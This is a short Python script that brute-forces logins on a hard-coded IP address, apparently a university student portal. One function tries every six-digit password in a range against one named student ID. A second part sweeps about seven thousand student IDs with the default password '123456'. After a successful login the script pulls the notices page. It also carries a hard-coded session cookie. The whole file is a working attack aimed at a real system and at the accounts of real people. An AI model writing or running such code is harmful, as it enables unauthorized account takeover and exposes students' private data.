#!/bin/env python3
# -*- coding: UTF-8 -*-

# from http import cookies
import urllib.request, urllib.parse

cookie='ASPSESSIONIDQSCRDTDT=BDILIEMCJBBJKOBMFFHODGLJ'

def _dump(sid,pswd):
    logData=urllib.parse.urlencode({
        'xsxh':sid, 
        'mm':pswd, 
        'Login':'%B5%C7%C2%BC'
    }).encode('utf-8')
    req=urllib.request.Request('http://115.156.233.249/login.asp', headers={
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4',
        'Cache-Control':'no-cache',
        'Connection':'keep-alive',
        'Content-Length':'43',
        'Content-Type':'application/x-www-form-urlencoded',
        'Cookie':cookie,
        'Host':'115.156.233.249',
        'Origin':'http://115.156.233.249',
        'Pragma':'no-cache',
        'Referer':'http://115.156.233.249/login.asp',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    })
    resp=urllib.request.urlopen(req, data=logData)
    respstr=resp.read().decode('utf-8', errors = 'backslashreplace')
    if len(respstr) < 5000:
        print('<div align="center"> Login failed.')
        return False
    print('<div align="center"> Login done.')
    
    req=urllib.request.Request('http://115.156.233.249/TongZhi.asp', headers={
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4',
        'Cache-Control':'no-cache',
        'Connection':'keep-alive',
        'Cookie':cookie,
        'Host':'115.156.233.249',
        'Origin':'http://115.156.233.249',
        'Pragma':'no-cache',
        'Referer':'http://115.156.233.249/login.asp',
        'Upgrade-Insecure-Requests':'1',
        'User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
    })
    resp=urllib.request.urlopen(req)
    respstr=resp.read().decode('gb2312', errors = 'backslashreplace')
    print(respstr, len(respstr))
    return True

def tryDump(sid):
    print('<div align="center"> -----Dumping', sid)
    return _dump(sid,'123456')

def crackOneAccount(sid, rangeGen=range(1000000)):
    for i in rangeGen:
        psw=str(i).zfill(6)
        print('Testing', psw, '...')
        if _dump(sid,psw):
            print('Done. password='+psw)

crackOneAccount('201614531', range(800000, 1000000))
exit(0)
####
success=0
fail=0
for i in range(201610001, 201617174):
    if tryDump(str(i)):
        success+=1
    else:
        fail+=1
print('<div align="center"> Done. Success', success, 'Fail', fail)

